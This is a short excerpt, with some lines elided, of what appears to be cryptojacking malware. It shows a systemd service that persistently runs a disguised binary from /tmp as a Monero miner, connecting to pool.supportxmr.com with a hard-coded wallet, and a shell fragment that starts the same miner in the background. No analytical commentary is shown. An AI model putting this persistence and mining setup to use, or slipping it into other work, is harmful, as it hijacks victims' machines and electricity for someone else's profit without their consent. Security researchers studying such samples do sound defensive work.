...
[Service]
Type=simple
ExecStart=/tmp/rcupd --coin monero -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
Restart=always
RestartSec=20
...
if [ ! -x "${he_save}" ]; then
    ...
    ${he_save} --coin 'monero' -B -o pool.supportxmr.com:3333 -u 48G18KuK8ypBTKPWVvdRW9LcWkKNpN85sNZSoByZAkEH4SYmsS9PgPDM9vSSBoctfnQzA2kXELerdhc4boyJcdEwAJaij3e -p docker
fi
